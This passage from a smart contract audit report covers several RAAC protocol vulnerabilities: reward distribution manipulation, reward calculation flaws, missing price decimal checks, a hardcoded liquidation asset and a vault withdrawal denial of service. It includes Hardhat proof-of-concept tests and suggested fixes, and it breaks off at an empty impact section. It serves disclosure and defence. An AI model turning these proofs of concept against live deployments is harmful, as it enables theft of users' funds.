Introduce a mechanism to track the total voting power a user has allocated across all gauges. This ensures that a user cannot exceed their available voting power when voting on multiple gauges.

Modify the vote function to check whether the user has sufficient remaining voting power before allowing a new vote.

## <a id='H-19'></a>H-19. Malicious users can prematurely call GaugeController::distributeRewards immediately after voting and send all rewards to any gauge they want

## Summary

GaugeController::distributeRewards is vulnerable to exploitation because it lacks access controls and time constraints. This allows any user to call the function at any time, enabling them to manipulate reward distribution by voting with high weights on a specific gauge and immediately triggering reward distribution. This results in an unfair allocation of rewards, centralizing them in the attacker's chosen gauge and undermining the protocol's fairness and decentralization.

## Vulnerability Details

GaugeController::distributeRewards allows rewards calculated by the gauge controller to be correctly distributed to the gauges that have the associated weights. Weights are associated to gauges when they are created with GaugeController::addGauge and these gauges are changed based on user votes. Users with veRAAC tokens are allowed to vote and assign weights to any gauge of their choice which changes the gauge weight and in turn, the rewards the gauges receive.

```solidity
 /**
     * @notice Distributes rewards to a gauge
     * @dev Calculates and transfers rewards based on gauge weight
     * @param gauge Address of gauge to distribute rewards to
     */
    function distributeRewards(
        address gauge
    ) external override nonReentrant whenNotPaused {

        if (!isGauge(gauge)) revert GaugeNotFound();
        if (!gauges[gauge].isActive) revert GaugeNotActive();

        uint256 reward = _calculateReward(gauge);
        if (reward == 0) return;

        IGauge(gauge).notifyRewardAmount(reward);
        emit RewardDistributed(gauge, msg.sender, reward);


    }

```

The exploit occurs because the GaugeController::distributeRewards function has no access controls and no time constraints which means anyone can call it at any time. This presents attackers with an opportunity to assign a high weight to any vote they are currently staked in and immediately call GaugeController::distributeReward which will assign all rewards to that gauge leaving no time for other users to vote on any gauge weights and assigning rewards to whatever gauge of the user's choice

## Proof Of Code (POC)

This test was run in GaugeController.test.js file in the "Period Management" describe block. There is some extra setup required in this test as the veRAACToken used in this file is a MockToken that doesnt take decay into account. As a result, we have to change the setup to implement veRAACToken.sol. To do this, replace the "GaugeController" descibe block and its beforeEach with the following:

```javascript
describe("GaugeController", () => {
  let gaugeController;
  let rwaGauge;
  let raacGauge;
  let veRAACToken;
  let rewardToken;
  let owner;
  let gaugeAdmin;
  let emergencyAdmin;
  let feeAdmin;
  let raacToken;
  let user1;
  let user2;
  let user3;
  let user4;
  let users;

  const MONTH = 30 * 24 * 3600;
  const WEEK = 7 * 24 * 3600;
  const WEIGHT_PRECISION = 10000;
  const { MaxUint256 } = ethers;
  const duration = 365 * 24 * 3600; // 1 year

  beforeEach(async () => {
    [
      owner,
      gaugeAdmin,
      emergencyAdmin,
      feeAdmin,
      user1,
      user2,
      user3,
      user4,
      ...users
    ] = await ethers.getSigners(); //c added ...users to get all users and added users 3 and 4 to the list of users for testing purposes

    // Deploy Mock tokens
    const MockToken = await ethers.getContractFactory("MockToken");
    /*veRAACToken = await MockToken.deploy("veRAAC Token", "veRAAC", 18);
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress(); */

    //c this should use the actual veRAACToken address and not a mock token as veRAAC has different mechanics to this mocktoken because the rate of decay is not considered at all in this mock token which allows for limiting POC's that produce false positives. the above code block was commented out for testing purposes

    const MockRAACToken = await ethers.getContractFactory("ERC20Mock");
    raacToken = await MockRAACToken.deploy("RAAC Token", "RAAC");
    await raacToken.waitForDeployment();

    const VeRAACToken = await ethers.getContractFactory("veRAACToken");
    veRAACToken = await VeRAACToken.deploy(await raacToken.getAddress());
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress();

    rewardToken = await MockToken.deploy("Reward Token", "REWARD", 18);
    await rewardToken.waitForDeployment();
    const rewardTokenAddress = await rewardToken.getAddress();

    // Deploy GaugeController with correct parameters
    const GaugeController = await ethers.getContractFactory("GaugeController");
    gaugeController = await GaugeController.deploy(veRAACAddress);
    await gaugeController.waitForDeployment();
    const gaugeControllerAddress = await gaugeController.getAddress();

    // Deploy RWAGauge with correct parameters
    const RWAGauge = await ethers.getContractFactory("RWAGauge");
    rwaGauge = await RWAGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await rwaGauge.waitForDeployment();

    // Deploy RAACGauge with correct parameters
    const RAACGauge = await ethers.getContractFactory("RAACGauge");
    raacGauge = await RAACGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await raacGauge.waitForDeployment();

    // Setup roles
    const GAUGE_ADMIN_ROLE = await gaugeController.GAUGE_ADMIN();
    const EMERGENCY_ADMIN_ROLE = await gaugeController.EMERGENCY_ADMIN();
    const FEE_ADMIN_ROLE = await gaugeController.FEE_ADMIN();

    await gaugeController.grantRole(GAUGE_ADMIN_ROLE, gaugeAdmin.address);
    await gaugeController.grantRole(
      EMERGENCY_ADMIN_ROLE,
      emergencyAdmin.address
    );
    await gaugeController.grantRole(FEE_ADMIN_ROLE, feeAdmin.address);

    // Add gauges
    await gaugeController.connect(gaugeAdmin).addGauge(
      await rwaGauge.getAddress(),
      0, // RWA type
      0 // Initial weight
    );
    await gaugeController.connect(gaugeAdmin).addGauge(
      await raacGauge.getAddress(),
      1, // RAAC type
      0 // Initial weight
    );

    // Initialize gauges
    await rwaGauge.grantRole(await rwaGauge.CONTROLLER_ROLE(), owner.address);
    await raacGauge.grantRole(await raacGauge.CONTROLLER_ROLE(), owner.address);
  });
```

The relevant test is below:

```javascript
it("user can prematurely call distributeRewards immediately after voting and send all rewards to any gauge they want", async () => {
  //c for testing purposes
  //c setup user 1 to lock raac tokens to enable gauge voting
  const INITIAL_MINT = ethers.parseEther("1000000");
  await raacToken.mint(user1.address, INITIAL_MINT);
  await raacToken
    .connect(user1)
    .approve(await veRAACToken.getAddress(), MaxUint256);

  //c user 1 locks raac tokens to gain veRAAC voting power
  await veRAACToken.connect(user1).lock(INITIAL_MINT, duration);
  const user1bal = await veRAACToken.balanceOf(user1.address);
  console.log("User 1 balance", user1bal);

  //c user1 votes on raac gauge
  await gaugeController.connect(user1).vote(await raacGauge.getAddress(), 5000);

  //c make sure the gauge has some rewards to distribute
  await rewardToken.mint(
    raacGauge.getAddress(),
    ethers.parseEther("10000000000")
  );

  //c get weight of user1's vote on raac gauge
  const user1RAACvotes = await gaugeController.userGaugeVotes(
    user1.address,
    await raacGauge.getAddress()
  );
  console.log("User 1 votes", user1RAACvotes);

  //c allow some time to pass for rewards to accrue
  const DAY = 24 * 3600;
  await time.increase(DAY + 1);

  //c user1 calls distribute rewards and sends all rewards to rwa gauge
  const tx = await gaugeController
    .connect(user1)
    .distributeRewards(await raacGauge.getAddress());

  const totalWeight = await gaugeController.getTotalWeight();
  console.log("Total Weight", totalWeight);

  const calcReward = await gaugeController._calculateReward(
    await raacGauge.getAddress()
  );
  console.log("Calc Reward", calcReward);

  const txReceipt = await tx.wait();
  const eventLogs = txReceipt.logs;
  let reward;

  for (let log of eventLogs) {
    if (log.fragment && log.fragment.name === "RewardDistributed") {
      reward = log.args[2];
      break;
    }
  }
  console.log("Reward", reward);

  //c proof that all rewards were sent to rwa gauge
  const period = await raacGauge.periodState();
  const distributed = period.distributed;
  console.log("Distributed", distributed);

  assert(reward == distributed);
});
```

## Impact

The vulnerability allows a malicious user to manipulate the reward distribution process by:

Voting with High Weight: A user can assign a high weight to a specific gauge they are staked in.

Immediately Distributing Rewards: The user can call distributeRewards immediately after voting, ensuring that the rewards are allocated to their chosen gauge before other users have a chance to vote or adjust weights.

Centralizing Rewards: This results in an unfair distribution of rewards, as the attacker can monopolize the rewards for their gauge, leaving little to no rewards for other gauges.

## Tools Used

Manual Review, Hardhat

## Recommendations

Introduce Time Constraints
Ensure that reward distribution can only occur at specific intervals (e.g., at the end of a voting period).
This prevents users from manipulating rewards by calling distributeRewards immediately after voting.

Add Access Controls
Restrict the distributeRewards function to only be callable by authorized addresses (e.g., the protocol admin or a dedicated reward distributor contract). This prevents malicious users from triggering reward distribution at will.

## <a id='H-20'></a>H-20. Incorrect reward calculation in BaseGauge::\_updateReward leads to reward dilution and/or a complete loss of rewards

## Summary

The getRewardPerToken function in the reward distribution mechanism calculates rewards based on the time elapsed since the last update (lastTimeRewardApplicable() - lastUpdateTime). If no time has passed (e.g., block.timestamp is equal to lastUpdateTime), the rewards calculated will be zero. This results in no rewards being distributed to users, even if they have staked tokens and are eligible for rewards.

This also allows users who claim rewards earlier to receive disproportionately more rewards, even if they have staked fewer tokens. This occurs due to the way rewardPerTokenStored is updated when a user calls getReward(). As a result, users who claim rewards later receive fewer rewards, leading to an unfair distribution of rewards.

## Vulnerability Details

The issue arises because the getRewardPerToken function relies on the time elapsed since the last update to calculate rewards. Specifically:

```solidity
function getRewardPerToken() public view returns (uint256) {
    if (totalSupply() == 0) {
        return rewardPerTokenStored;
    }
    return
        rewardPerTokenStored +
        (((lastTimeRewardApplicable() - lastUpdateTime) *
            rewardRate *
            1e18) / totalSupply());
}
```

lastTimeRewardApplicable(): Returns the current timestamp (block.timestamp) if it is less than the periodFinish time, otherwise returns periodFinish.

lastUpdateTime: The timestamp of the last reward update.

If block.timestamp is equal to lastUpdateTime (i.e., no time has passed since the last update), the term (lastTimeRewardApplicable() - lastUpdateTime) becomes zero. As a result, the reward calculation returns rewardPerTokenStored, and no additional rewards are accrued. This is exactly what happens when raacGauge::notifyRewardAmount is called. The lastUpdateTime is updated to the current timestamp.

Another issue arises because the getReward() function updates the rewardPerTokenStored value for the calling user, but this update affects the reward calculations for all users. Specifically:

getReward() Function:

When a user calls getReward(), the \_updateReward function is invoked, which updates the rewardPerTokenStored value.
This update is based on the current time and the rewardRate, and it affects the reward calculations for all users. As a result, if user1 calls getReward() before user2, the rewardPerTokenStored value is updated to reflect the rewards accrued up to that point.

When user2 later calls getReward(), the rewardPerTokenStored value has already been updated, and user2 receives fewer rewards than they should, even if they have staked more tokens.

Example Scenario:

user1 stakes 100 tokens.
user2 stakes 200 tokens.

Rewards are notified, and time passes.
user1 calls getReward() first, updating rewardPerTokenStored.
user2 calls getReward() later and receives fewer rewards than they should, even though they have staked more tokens.

# Proof Of Code (POC)

These tests were run in the RAACGauge.test.js file in the "Reward Distribution" describe block

```javascript
 describe("Reward Distribution", () => {
    beforeEach(async () => {
      await veRAACToken
        .connect(user1)
        .approve(raacGauge.getAddress(), ethers.MaxUint256);
      await veRAACToken
        .connect(user2)
        .approve(raacGauge.getAddress(), ethers.MaxUint256);
      await raacGauge.connect(user1).stake(ethers.parseEther("100"));
      await raacGauge.connect(user2).stake(ethers.parseEther("200"));
      await raacGauge.notifyRewardAmount(ethers.parseEther("1000"));

      await raacGauge.connect(user1).voteEmissionDirection(5000);
    });

    it("if rewards are claimed in same block as notifyRewardAmount, users get no rewards even though they have staked amounts and are eligible", async () => {
      //c for testing purposes
      //await time.increase(WEEK / 2);

      const balanceprerewarddistribution = await rewardToken.balanceOf(
        user1.address
      );
      console.log(
        "balance of user1 before reward distribution",
        balanceprerewarddistribution.toString()
      );

      const balanceprerewarddistribution2 = await rewardToken.balanceOf(
        user2.address
      );
      console.log(
        "balance of user2 before reward distribution",
        balanceprerewarddistribution2.toString()
      );

      const earnedUser1 = await raacGauge.earned(user1.address);
      console.log(earnedUser1.toString());
      const earnedUser2 = await raacGauge.earned(user2.address);
      console.log(earnedUser2.toString());

      await raacGauge.connect(user1).getReward();
      await raacGauge.connect(user2).getReward();
      const balance = await rewardToken.balanceOf(user1.address);
      console.log("balance of user1", balance.toString());
      const balance2 = await rewardToken.balanceOf(user2.address);
      console.log("balance of user2", balance2.toString());

      //c confirm that there are rewards to be distributed
      const weeklyState = await raacGauge.periodState();
      const distributed = weeklyState.distributed;
      console.log("distributed", distributed.toString());
      assert(distributed > 0);

      //c there are actually no rewards distributed because the lastUpdateTime and lastTimeRewardApplicable are the same which shouldnt matter but it does in this protocol
      assert(balanceprerewarddistribution == balance);
      assert(balanceprerewarddistribution2 == balance2);
      assert(earnedUser1 == 0);
      assert(earnedUser2 == 0);
    });

    it("user1 gets more rewards than user2 simply based on the claim time even when user2 has a higher staked balance", async () => {
      //c for testing purposes
      await time.increase(WEEK / 2);

      const earnedUser1 = await raacGauge.earned(user1.address);
      console.log(earnedUser1.toString());
      const earnedUser2 = await raacGauge.earned(user2.address);
      console.log(earnedUser2.toString());

      await raacGauge.connect(user1).getReward();
      await raacGauge.connect(user2).getReward();
      const balance = await rewardToken.balanceOf(user1.address);
      console.log("balance of user1", balance.toString());
      const balance2 = await rewardToken.balanceOf(user2.address);
      console.log("balance of user2", balance2.toString());

      //c confirm that there are rewards to be distributed
      const weeklyState = await raacGauge.periodState();
      const distributed = weeklyState.distributed;
      console.log("distributed", distributed.toString());
      assert(distributed > 0);

      //c user1 gets more rewards than user2 simply based on the claim time even when user2 has a higher staked balance
      assert(balance > balance2);
    });

```

These are the logs from each test:

```

  RAACGauge
    Reward Distribution
balance of user1 before reward distribution 1000000000000000000000
balance of user2 before reward distribution 1000000000000000000000
0
0
balance of user1 1000000000000000000000
balance of user2 1000000000000000000000
distributed 1000000000000000000000
      ✔ if rewards are claimed in same block as notifyRewardAmount, users get no rewards even though they have staked amounts and are eligible (170ms)


  1 passing (12s)


  RAACGauge
    Reward Distribution
31666666
21666666
balance of user1 1000000000000031666666
balance of user2 1000000000000021666666
distributed 1000000000000000000000
      ✔ user1 gets more rewards than user2 simply based on the claim time even when user2 has a higher staked balance (208ms)


  1 passing (12s)

```

## Impact

Unfair Reward Distribution: Users who claim rewards earlier receive disproportionately more rewards, even if they have staked fewer tokens. This undermines the fairness of the protocol and discourages users from participating. It also creates incentives to game the system and can create gas wars to be first to call raacGauge::getReward after an amount of time has elapsed. A user can also unfairly dilute another user's rewards by front running their raacGauge::getReward call.

Economic Inefficiency: The protocol's reward distribution mechanism becomes inefficient, as it does not accurately reflect the contributions of users based on their staked amounts.

## Tools Used

Manual Review, Hardhat

## Recommendations

To fix this issue, the reward distribution mechanism should be modified to ensure that rewards are distributed fairly based on the staked amounts of users, regardless of when they claim their rewards. This can be achieved by:

Separate Reward Tracking

Track rewards for each user separately, without updating the global rewardPerTokenStored value when a user claims rewards.
This ensures that the reward calculations for one user do not affect the reward calculations for other users.

Ensuring that the earned function calculates rewards based on the user's staked amount and the time elapsed since the last update, without being affected by other users' actions.

# Medium Risk Findings

## <a id='M-01'></a>M-01. Incorrect Price Precision Validation in RAACNFT::mint when retrieving price using chainlink functions can lead to allowing users mint NFT for a fraction of intended cost

## Summary

RAACNFT::mint function does not validate that the house price retrieved from raac_hp.tokenToHousePrice(\_tokenId) is denominated in 18 decimals. Since Chainlink Functions can only return values as arbitrary uint256 from the source configured by RAAC, the absence of this validation can lead to incorrect minting prices, potentially allowing users to mint NFTs at unintended lower prices.

## Vulnerability Details

RAACNFT::mint contains the following:

```solidity
  function mint(uint256 _tokenId, uint256 _amount) public override {
        uint256 price = raac_hp.tokenToHousePrice(_tokenId);
        if(price == 0) { revert RAACNFT__HousePrice(); }
        if(price > _amount) { revert RAACNFT__InsufficientFundsMint(); }

        // transfer erc20 from user to contract - requires pre-approval from user
        token.safeTransferFrom(msg.sender, address(this), _amount);

        // mint tokenId to user
        _safeMint(msg.sender, _tokenId);

         // If user approved more than necessary, refund the difference
        if (_amount > price) {
            uint256 refundAmount = _amount - price;
            token.safeTransfer(msg.sender, refundAmount);
        }

        emit NFTMinted(msg.sender, _tokenId, price);
    }

```

raac_hp.tokenToHousePrice(\_tokenId) is a mapping from RAACHousePrices.sol that stores the latest prices set by the chainlink oracles. See the relevant function below:

```solidity
  function setHousePrice(
        uint256 _tokenId,
        uint256 _amount
    ) external onlyOracle {
        tokenToHousePrice[_tokenId] = _amount;
        lastUpdateTimestamp = block.timestamp;
        emit PriceUpdated(_tokenId, _amount);
    }

```

RAAC uses chainlink functions to retrieve the latest house prices from the source they have configured and updates the tokenToHousePrice mapping as seen above. This can be seen in RAACHousePriceOracle.sol. The key function that does this is below:

```solidity
 function _processResponse(bytes memory response) internal override {
        uint256 price = abi.decode(response, (uint256));
        housePrices.setHousePrice(lastHouseId, price);
        emit HousePriceUpdated(lastHouseId, price);
    }
```

RAACHousePriceOracle::\_processResponse gets the response the RAAC source and calls RAACHousePrices::setHousePrice as described. There is no validation ensuring that price is denominated in 18 decimals. Unlike Chainlink Price Feeds, which have predefined decimal places for each asset, Chainlink Functions can return uint256 values that may have any arbitrary decimal precision depending on how the data source formats its response. With chainlink price feeds, whenever prices are received from the oracle, standard practice is to handle the decimal amounts and convert them to the required decimals. With chainlink functions, since prices are retrieved from RAAC source, it should follow the same behaviour to configure the decimals and prevent human error.

If the returned price has fewer decimals than expected which is very likely as human error can allow for a lack of precision. If such a situation occurs, the \_amount check:

```solidity
if(price > _amount) { revert RAACNFT__InsufficientFundsMint(); }
```

may allow the user to underpay for the NFT due to the incorrect price scale.

## Proof Of Code (POC)

This test was run in RAACNFT.test.js in the "Minting" describe block

```javascript
it("doesnotrevertwhenhousepricedoesnothave18decimals", async () => {
  await housePrices.setHousePrice(TOKEN_ID, ethers.parseEther("0.1"));
  await expect(raacNFT.connect(user1).mint(TOKEN_ID, ethers.parseEther("0.1")))
    .to.emit(raacNFT, "NFTMinted")
    .withArgs(user1.address, TOKEN_ID, ethers.parseEther("0.1"));

  expect(await raacNFT.ownerOf(TOKEN_ID)).to.equal(user1.address);
  expect(await crvUSD.balanceOf(raacNFT.getAddress())).to.equal(
    ethers.parseEther("0.1")
  );
});
```

## Impact

Financial Loss: Users may exploit incorrect pricing to mint NFTs for significantly less than intended.
NFT Devaluation: The house price is a core property of the NFT. If improperly set, the NFT may be rendered useless.
Potential Arbitrage: Users could mint NFTs at incorrect prices and resell them for profit.

## Tools Used

Manual Review, Hardhat

## Recommendations

Validate the Price Precision: Introduce a MINIMUM_PRICE_DECIMALS constant to enforce 18-decimal precision, ensuring that any incorrect price values are rejected.

```solidity
uint256 constant MINIMUM_PRICE_DECIMALS = 1e18;
```

Modify the mint function to include this check:

```solidity
if (price < MINIMUM_PRICE_DECIMALS) {
    revert RAACNFT__InvalidHousePrice();
}
```

Normalize Price Based on Expected Decimals: Instead of assuming the price has 18 decimals, explicitly retrieve the expected decimal format from the Chainlink Functions response and normalize the price before comparison.

If the function is expected to return a uint256 with X decimals, manually scale it to 18 decimals before use:

```solidity
uint8 expectedDecimals = 18; // Set this based on the expected Chainlink Functions response
uint256 normalizedPrice = price * (10 ** (18 - expectedDecimals));

if (normalizedPrice > _amount) {
    revert RAACNFT__InsufficientFundsMint();
}
```

This ensures that prices retrieved from Chainlink Functions are correctly scaled before use.

## <a id='M-02'></a>M-02. Users cannot be liquidated if reserveAsset does not match StabilityPool::crvUSD address

## Summary

The liquidation process in StabilityPool::liquidateBorrower incorrectly assumes that the reserve asset will always be crvUSD. However, LendingPool::finalizeLiquidation transfers the reserve asset from the Stability Pool to the reserve's RToken contract, meaning the reserve asset could be any stablecoin, including crvUSD but with a different contract address. If the reserve asset is not recognized as the expected crvUSD contract, the Stability Pool will incorrectly check its crvUSD balance, potentially causing the liquidation to revert and preventing borrowers from being liquidated.

## Vulnerability Details

The issue arises in the following code snippet from StabilityPool::liquidateBorrower:

```solidity
uint256 crvUSDBalance = crvUSDToken.balanceOf(address(this));
if (crvUSDBalance < scaledUserDebt) revert InsufficientBalance();
```

This check assumes that the reserve asset is always the crvUSD token contract that was initially deployed. However, LendingPool::finalizeLiquidation transfers the reserve asset using:

```solidity
IERC20(reserve.reserveAssetAddress).safeTransferFrom(
    msg.sender,
    reserve.reserveRTokenAddress,
    amountScaled
);
```

Here, reserve.reserveAssetAddress can be any stablecoin, including crvUSD with a different contract address. If the Stability Pool only checks for a specific crvUSD address rather than dynamically verifying the reserve asset, then any liquidation process involving a different crvUSD deployment or another stablecoin will fail.

If the reserve asset is not crvUSD, the liquidation will fail.The Stability Pool will check its crvUSD balance instead of the actual reserve asset balance, leading to an incorrect InsufficientBalance error. Even if the reserve asset is crvUSD, a different contract address could cause failure.

If the Lending Pool uses a different crvUSD contract instance than what the Stability Pool expects, the liquidation will not recognize the correct balance.

Project intends to reuse the same Lending Pool for other stablecoins

As confirmed by the developers in a private thread:

"We hope to be able to reuse the exact same contract for most other ERC20s (those with custom logic would draw a modified Lending Pool contract to do that, but all the 'classic' ERC20s should fit in the pool)."

"So for the pool, still a crvUSD at launch yes, but the same pool is supposed to be reused for other stables."

This confirms that the same Lending Pool may be used for different stablecoins, and the Stability Pool must support any reserve asset dynamically.

LendingPool constructor allows a flexible reserve asset

The LendingPool::constructor natspec contains:

```solidity
* @param _reserveAssetAddress The address of the reserve asset (e.g., crvUSD)
```

This implies that the reserve asset can be another token, including a different crvUSD deployment.

If the same Stability Pool is reused, and it only checks crvUSD by a hardcoded contract reference, then any future stablecoin-based reserves—including a differently deployed crvUSD—will not be liquidatable, leading to stuck positions and bad debt accumulation.

Proof Of Code (POC)
This test was run in protocols-test.js in the "StabilityPool" describe block

```javascript
it("liquidation not possible if reserveAsset is not crvUSD", async function () {
  //c for testing purposes
  // Setup stability pool deposit
  await contracts.altReserveAsset
    .connect(owner)
    .approve(contracts.stabilityPool.target, STABILITY_DEPOSIT);
  await contracts.altReserveAsset
    .connect(owner)
    .transfer(contracts.stabilityPool.target, STABILITY_DEPOSIT); //c this is where the stability pool gets the reserveAsset to cover the debt

  /*c to get access to the altReserveAsset, go to deploycontracts.js, deploy the altReserveAsset with the following line ABOVE the rtoken and lending pool contract deployments:
      
      //c get new mockerc20 contract to use as reserve asset
        const altReserveAsset = await deployContract("RAACMockERC20", [
          owner.address,
        ]);
   
       and in the rToken deployment, add the altReserveAsset.target to the arguments and remove crvUSD.target. Do the same for the lendingPool deployment and modify the above beforeEach hook as follows:

      beforeEach(async function () {
      await contracts.altReserveAsset
        .connect(user1)
        .approve(contracts.lendingPool.target, STABILITY_DEPOSIT);
      await contracts.lendingPool.connect(user1).deposit(STABILITY_DEPOSIT);
      await contracts.rToken
        .connect(user1)
        .approve(contracts.stabilityPool.target, STABILITY_DEPOSIT);
    }); */

  // Create position to be liquidated
  const newTokenId = HOUSE_TOKEN_ID + 2;
  await contracts.housePrices.setHousePrice(newTokenId, HOUSE_PRICE);
  await contracts.crvUSD
    .connect(user2)
    .approve(contracts.nft.target, HOUSE_PRICE);
  await contracts.nft.connect(user2).mint(newTokenId, HOUSE_PRICE);
  await contracts.nft
    .connect(user2)
    .approve(contracts.lendingPool.target, newTokenId);
  await contracts.lendingPool.connect(user2).depositNFT(newTokenId);
  await contracts.lendingPool.connect(user2).borrow(BORROW_AMOUNT);

  // Trigger and complete liquidation
  await contracts.housePrices.setHousePrice(
    newTokenId,
    (HOUSE_PRICE * 10n) / 100n
  );
  await contracts.lendingPool.connect(user3).initiateLiquidation(user2.address);
  await time.increase(73 * 60 * 60);

  // We need stability pool to have correct reserveAsset amount to cover the debt
  const initialBalance = await contracts.altReserveAsset.balanceOf(
    contracts.stabilityPool.target
  );

  //c This will revert when it shouldn't because the Stability Pool should be able to liquidate the borrower with the reserveAsset it has.
  await contracts.lendingPool.connect(owner).updateState();
  await expect(
    contracts.stabilityPool.connect(owner).liquidateBorrower(user2.address)
  ).to.be.revertedWithCustomError(
    contracts.stabilityPool,
    "InsufficientBalance"
  );
});
```

Impact

Failed Liquidations: If the reserve asset is not crvUSD or a different crvUSD contract address is used, the Stability Pool will incorrectly check its balance, causing liquidations to revert.

Future Incompatibility: The project plans to support other stablecoins in the same pool, but this bug makes the liquidation mechanism unsuitable for multi-asset reserves.

Tools Used
Manual Review
Hardhat

Recommendations
Dynamic Reserve Asset Retrieval
Instead of assuming crvUSD, the Stability Pool should dynamically check the actual reserve asset from the Lending Pool.

Add a getter function in LendingPool:

```solidity
function getReserveAsset() external view returns (address) {
    return reserve.reserveAssetAddress;
}
```

Update StabilityPool::liquidateBorrower to check the correct reserve asset:

```solidity

// Get the actual reserve asset from LendingPool
address reserveAsset = lendingPool.getReserveAsset();
```

Replace the hardcoded crvUSD balance check with the correct asset balance:

```solidity
uint256 stabilityPoolBalance = IERC20(reserveAsset).balanceOf(address(this));
if (stabilityPoolBalance < scaledUserDebt) revert InsufficientBalance();
```

This fix ensures that:

The liquidation process works correctly, regardless of the reserve asset.
Future stablecoins or different crvUSD deployments are properly supported.
The protocol remains resilient and adaptable to future asset changes.

By implementing this fix, the protocol can ensure seamless liquidation across multiple stablecoins, preventing bad debt accumulation and ensuring the long-term viability of the Lending Pool.

## <a id='M-03'></a>M-03. Deposits/Withdrawals can be DOS'ed if crvVault::withdraw produces any losses

## Summary

The Lending Pool's liquidity rebalancing mechanism interacts with a Curve vault to optimize liquidity distribution. However, the \_withdrawFromVault function in LendingPool hardcodes the max_loss parameter to 0, making the system vulnerable to denial-of-service (DOS) if the Curve vault ever incurs a small, unavoidable loss. This prevents users from withdrawing or depositing funds, disrupting core protocol functionality.

## Vulnerability Details

Users who want to gain RAAC tokens have to deposit crvUSD via LendingPool::deposit which mints Rtokens in return which are then deposited in the stability pool to gain RAAC token rewards. See LendingPool::deposit:

```solidity

    /**
     * @notice Allows a user to deposit reserve assets and receive RTokens
     * @param amount The amount of reserve assets to deposit
     */
    function deposit(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        // Update the reserve state before the deposit
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Perform the deposit through ReserveLibrary
        uint256 mintedAmount = ReserveLibrary.deposit(reserve, rateData, amount, msg.sender);

        // Rebalance liquidity after deposit
        _rebalanceLiquidity();

        emit Deposit(msg.sender, amount, mintedAmount);
    }

```

According to the documentation, users are allowed to withdraw assets they have deposited via LendingPool::withdraw at any time. See function:

```solidity
 /**
     * @notice Allows a user to withdraw reserve assets by burning RTokens
     * @param amount The amount of reserve assets to withdraw
     */
    function withdraw(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (withdrawalsPaused) revert WithdrawalsArePaused();

        // Update the reserve state before the withdrawal
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Perform the withdrawal through ReserveLibrary
        (uint256 amountWithdrawn, uint256 amountScaled, uint256 amountUnderlying) = ReserveLibrary.withdraw(
            reserve,   // ReserveData storage
            rateData,  // ReserveRateData storage
            amount,    // Amount to withdraw
            msg.sender // Recipient
        );

        // Rebalance liquidity after withdrawal
        _rebalanceLiquidity();

        emit Withdraw(msg.sender, amountWithdrawn);
    }
```

LendingPool::deposit and LendingPool::withdraw both call LendingPool::\_rebalanceLiquidity(). This function sets a liquidity buffer ratio which is what determines whether RAAC should deposit excess liquidity to a curve vault to get rewards or not. So it sets a buffer ratio and if the total available liquidity is greater than the buffer they should have, they deposit the excess into curve vault which is simply a crvUSD vault where users can deposit assets and gain rewards. if the total available liquidity is less than the buffer they should have, they withdraw the shortage from the curve vault. See function below:

```solidity
/**
     * @notice Rebalances liquidity between the buffer and the Curve vault to maintain the desired buffer ratio
     */
    function _rebalanceLiquidity() internal {
        // if curve vault is not set, do nothing
        if (address(curveVault) == address(0)) {
            return;
        }

        uint256 totalDeposits = reserve.totalLiquidity; // Total liquidity in the system
        uint256 desiredBuffer = totalDeposits.percentMul(liquidityBufferRatio);
        uint256 currentBuffer = IERC20(reserve.reserveAssetAddress).balanceOf(reserve.reserveRTokenAddress);

        if (currentBuffer > desiredBuffer) {
            uint256 excess = currentBuffer - desiredBuffer;
            // Deposit excess into the Curve vault
            _depositIntoVault(excess);
        } else if (currentBuffer < desiredBuffer) {
            uint256 shortage = desiredBuffer - currentBuffer;
            // Withdraw shortage from the Curve vault
            _withdrawFromVault(shortage);
        }

        emit LiquidityRebalanced(currentBuffer, totalVaultDeposits);
    }

```

The key DOS for deposits and withdrawals happens in LendingPool::\_withdrawFromVault. See below:

```solidity
 /**
     * @notice Internal function to withdraw liquidity from the Curve vault
     * @param amount The amount to withdraw
     */
    function _withdrawFromVault(uint256 amount) internal {
        curveVault.withdraw(amount, address(this), msg.sender, 0, new address[](0));
        totalVaultDeposits -= amount;
    }
}
```

The curve vault code can be viewed at . The curve vault contains a withdraw function written in vyper. On inspection of that function, it can be seen that where LendingPool::\_withdrawFromVault passes 0 to the curve vault's withdraw function is a max_loss variable where the caller specifies the maximum amount of losses they are willing to take during the withdrawal. See the following extracts from the vault code:

```python
def _redeem(
    sender: address,
    receiver: address,
    owner: address,
    assets: uint256,
    shares: uint256,
    max_loss: uint256,
    strategies: DynArray[address, MAX_QUEUE]
) -> uint256:
    """
    This will attempt to free up the full amount of assets equivalent to
    `shares` and transfer them to the `receiver`. If the vault does
    not have enough idle funds it will go through any strategies provided by
    either the withdrawer or the default_queue to free up enough funds to
    service the request.

    The vault will attempt to account for any unrealized losses taken on from
    strategies since their respective last reports.

    Any losses realized during the withdraw from a strategy will be passed on
    to the user that is redeeming their vault shares unless it exceeds the given
    `max_loss`.
    """
```

There is also the following line in the \_redeem function which is what handles the withdrawal:

```python
  # Check if there is a loss and a non-default value was set.
    if assets > requested_assets and max_loss < MAX_BPS:
        # Assure the loss is within the allowed range.
        assert assets - requested_assets <= assets * max_loss / MAX_BPS, "too much loss"

```

Since the hardcoded value passed as max_loss is 0, if there is ever a situation where the vault strategy takes losses and needs to pass these losses on to the user, which is RAAC in this case, the transaction will simply revert with "too much loss". As a result, any function that calls LendingPool::\_rebalanceLiquidity() will also revert which stops RAAC users from being able to perform key functionality. If the Curve vault’s strategy incurs even a tiny loss, no funds can be withdrawn, effectively halting the ability to deposit and withdraw funds in the Lending Pool.

I would write a POC for this but the curve vault is written in vyper and I would have to convert this to solidity which includes knowing what the curve default strategies are how to implement them which is time intensive and impractical when the issue is explainable in text.

## Impact

